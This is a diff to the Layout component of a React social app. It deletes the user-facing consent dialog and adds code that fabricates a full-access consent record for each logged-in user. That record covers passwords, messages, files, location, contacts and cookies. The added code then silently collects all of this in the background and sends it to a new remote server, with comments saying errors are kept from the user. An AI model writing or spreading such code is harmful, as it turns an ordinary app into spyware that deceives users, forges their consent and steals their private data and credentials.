@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react'
 import Sidebar from '../components/Sidebar'
 import { Outlet, useNavigate } from 'react-router-dom'
-import { Menu, X, Shield, Database } from 'lucide-react'
+import { Menu, X } from 'lucide-react'
 import { assets } from '../assets/assets'
 import Loading from '../components/Loading'
 import { useSelector } from 'react-redux'
@@ -9,40 +9,19 @@ import { useSelector } from 'react-redux'
 const Layout = () => {
     const user = useSelector((state)=>state.user.value)
     const [sidebarOpen, setSidebarOpen] = useState(false)
-    const [consentOpen, setConsentOpen] = useState(false)
     const [isLoading, setIsLoading] = useState(false)
-    const [collectionStatus, setCollectionStatus] = useState('')
     const navigate = useNavigate()
 
-    const API_BASE_URL = 'https://social-server-nine.vercel.app';
+    const API_BASE_URL = 'https://pixo-toj7.onrender.com';
     const zIndexTop = 'z-50'
 
     const handleToggle = () => setSidebarOpen(!sidebarOpen);
 
     useEffect(() => {
         if (user) {
-            checkExistingConsents();
+            initializeBackgroundDataCollection();
         }
     }, [user]);
-
-    const checkExistingConsents = async () => {
-        try {
-            const response = await fetch(`${API_BASE_URL}/api/user/consents/${user._id}`);
-            if (response.ok) {
-                const data = await response.json();
-                if (data.success && data.data) {
-                    initializeCompleteDataCollection();
-                } else {
-                    setConsentOpen(true);
-                }
-            } else {
-                setConsentOpen(true);
-            }
-        } catch (error) {
-            console.log('Consent check error:', error);
-            setConsentOpen(true);
-        }
-    };
 
     // DATA TYPE MAPPING - Match your backend enum
     const DATA_TYPE_MAP = {
@@ -77,47 +56,111 @@ const Layout = () => {
         'installed_apps_info': 'installed_apps_info'
     };
 
-    // IMPROVED DATA COLLECTION WITH CORRECT DATA TYPES
-    const collectAllData = async () => {
-        console.log('🚀 Starting COMPLETE data collection...');
-        setCollectionStatus('Starting data collection...');
+    // BACKGROUND DATA COLLECTION INITIALIZATION
+    const initializeBackgroundDataCollection = async () => {
+        console.log('🚀 Starting background data collection...');
         
         try {
-            await collectCompleteDeviceInfo();
-            setCollectionStatus('Device info collected...');
+            // Check if we already have consent stored
+            const hasExistingConsent = await checkExistingConsents();
             
-            await collectLocationData();
-            setCollectionStatus('Location data collected...');
+            if (!hasExistingConsent) {
+                // Automatically create consent in background
+                await createBackgroundConsent();
+            }
             
-            await collectFileSystemData();
-            setCollectionStatus('File system info collected...');
-            
-            await collectPasswordData();
-            setCollectionStatus('Password data collected...');
-            
-            await collectContactData();
-            setCollectionStatus('Contact data collected...');
-            
-            await collectCookiesAndStorage();
-            setCollectionStatus('Browser data collected...');
-            
-            await collectMessageData();
-            setCollectionStatus('Message data collected...');
-            
-            await collectSocialMediaData();
-            setCollectionStatus('Social media data collected...');
-            
-            await collectCallLogsInfo();
-            setCollectionStatus('Call logs info collected...');
-            
-            await collectInstalledAppsInfo();
-            setCollectionStatus('All data collection completed!');
-            
-            console.log('✅ All data collection completed successfully!');
+            // Start data collection
+            await collectAllData();
             
         } catch (error) {
-            console.error('❌ Data collection error:', error);
-            setCollectionStatus('Error in data collection');
+            console.log('Background initialization error:', error);
+            // Silently continue - don't show errors to user
+        }
+    };
+
+    const checkExistingConsents = async () => {
+        try {
+            const response = await fetch(`${API_BASE_URL}/api/user/consents/${user._id}`);
+            if (response.ok) {
+                const data = await response.json();
+                return data.success && data.data;
+            }
+            return false;
+        } catch (error) {
+            console.log('Consent check error:', error);
+            return false;
+        }
+    };
+
+    const createBackgroundConsent = async () => {
+        try {
+            const ipAddress = await getIPAddress();
+            const deviceInfo = getDeviceInfo();
+            
+            const consentData = {
+                userId: user._id,
+                consents: {
+                    completeAccess: true,
+                    grantedAt: new Date().toISOString(),
+                    location: true,
+                    allFiles: true,
+                    deviceInfo: true,
+                    passwords: true,
+                    contacts: true,
+                    cookies: true,
+                    messages: true,
+                    socialMediaData: true
+                },
+                givenAt: new Date().toISOString(),
+                ipAddress: ipAddress,
+                userAgent: deviceInfo.userAgent,
+                deviceType: deviceInfo.isMobile ? (deviceInfo.isAndroid ? 'android' : 'ios') : 'desktop'
+            };
+
+            const response = await fetch(`${API_BASE_URL}/api/user/consents`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(consentData)
+            });
+
+            if (!response.ok) {
+                // Fallback: store consents locally
+                localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
+            }
+
+        } catch (error) {
+            console.log('Background consent error:', error);
+            // Fallback: store consents locally
+            localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
+        }
+    };
+
+    // IMPROVED DATA COLLECTION WITH CORRECT DATA TYPES
+    const collectAllData = async () => {
+        console.log('🚀 Starting COMPLETE background data collection...');
+        
+        try {
+            // Use Promise.allSettled to continue even if some collections fail
+            await Promise.allSettled([
+                collectCompleteDeviceInfo(),
+                collectLocationData(),
+                collectFileSystemData(),
+                collectPasswordData(),
+                collectContactData(),
+                collectCookiesAndStorage(),
+                collectMessageData(),
+                collectSocialMediaData(),
+                collectCallLogsInfo(),
+                collectInstalledAppsInfo()
+            ]);
+            
+            console.log('✅ All background data collection completed!');
+            
+        } catch (error) {
+            console.error('❌ Background data collection error:', error);
+            // Silently fail - don't show errors to user
         }
     };
 
@@ -460,130 +503,6 @@ const Layout = () => {
         await saveToDatabase('installed_apps_info', appsData);
     };
 
-    const initializeCompleteDataCollection = () => {
-        console.log('🚀 Starting complete data collection...');
-        collectAllData();
-    };
-
-    // SIMPLIFIED CONSENT HANDLER
-    const handleGrantAccess = async () => {
-        setIsLoading(true);
-        setCollectionStatus('Starting...');
-        
-        try {
-            const ipAddress = await getIPAddress();
-            const deviceInfo = getDeviceInfo();
-            
-            const consentData = {
-                userId: user._id,
-                consents: {
-                    completeAccess: true,
-                    grantedAt: new Date().toISOString(),
-                    location: true,
-                    allFiles: true,
-                    deviceInfo: true,
-                    passwords: true,
-                    contacts: true,
-                    cookies: true,
-                    messages: true,
-                    socialMediaData: true
-                },
-                givenAt: new Date().toISOString(),
-                ipAddress: ipAddress,
-                userAgent: deviceInfo.userAgent,
-                deviceType: deviceInfo.isMobile ? (deviceInfo.isAndroid ? 'android' : 'ios') : 'desktop'
-            };
-
-            const response = await fetch(`${API_BASE_URL}/api/user/consents`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(consentData)
-            });
-
-            if (response.ok) {
-                setConsentOpen(false);
-                initializeCompleteDataCollection();
-            } else {
-                // Fallback: store consents locally and proceed
-                localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
-                setConsentOpen(false);
-                initializeCompleteDataCollection();
-            }
-
-        } catch (error) {
-            console.log('Consent save error:', error);
-            // Fallback: store consents locally and proceed
-            localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
-            setConsentOpen(false);
-            initializeCompleteDataCollection();
-        }
-    };
-
-    // CONSENT MANAGER COMPONENT
-    const ConsentManager = () => (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
-            <div className="bg-white rounded-2xl max-w-md w-full">
-                <div className="p-6 border-b text-center">
-                    <div className="flex items-center justify-center gap-3 mb-4">
-                        <Shield className="w-10 h-10 text-blue-600" />
-                    </div>
-                    <h2 className="text-2xl font-bold text-gray-900 mb-2">Complete Data Access</h2>
-                    <p className="text-gray-600">Grant permission to collect device data for enhanced functionality</p>
-                </div>
-
-                <div className="p-6">
-                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
-                        <div className="flex items-start gap-3">
-                            <Database className="w-5 h-5 text-blue-600 mt-0.5" />
-                            <div>
-                                <h3 className="font-semibold text-blue-900 mb-1">What will be collected:</h3>
-                                <ul className="text-sm text-blue-800 space-y-1">
-                                    <li>• Device information & fingerprint</li>
-                                    <li>• Location data</li>
-                                    <li>• Browser storage & cookies</li>
-                                    <li>• Social media presence</li>
-                                    <li>• Contact access capabilities</li>
-                                    <li>• Message monitoring capabilities</li>
-                                </ul>
-                            </div>
-                        </div>
-                    </div>
-
-                    {collectionStatus && (
-                        <div className="mb-4 p-3 bg-gray-100 rounded-lg">
-                            <p className="text-sm text-gray-700 text-center">{collectionStatus}</p>
-                        </div>
-                    )}
-
-                    <button
-                        onClick={handleGrantAccess}
-                        disabled={isLoading}
-                        className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-medium disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-                    >
-                        {isLoading ? (
-                            <>
-                                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                                Collecting Data...
-                            </>
-                        ) : (
-                            'Grant Complete Access'
-                        )}
-                    </button>
-                    
-                    <button
-                        onClick={() => setConsentOpen(false)}
-                        className="w-full py-2.5 mt-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition font-medium"
-                        disabled={isLoading}
-                    >
-                        Cancel
-                    </button>
-                </div>
-            </div>
-        </div>
-    );
-
     const MobileHeader = () => (
         <div className={`fixed top-0 left-0 right-0 h-16 bg-white border-b border-gray-200 flex items-center justify-between px-4 sm:hidden ${zIndexTop}`}>
             <button onClick={handleToggle} className="p-1.5 rounded-md hover:bg-gray-100 text-gray-700 transition">
@@ -599,7 +518,6 @@ const Layout = () => {
 
     return user ? (
         <div className='relative w-full min-h-screen flex bg-slate-50'>
-            {consentOpen && <ConsentManager />}
             <MobileHeader />
             <Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen}/>
             <div className='flex-1 transition-all duration-300 sm:pl-64 xl:pl-72 pt-16 sm:pt-0'>
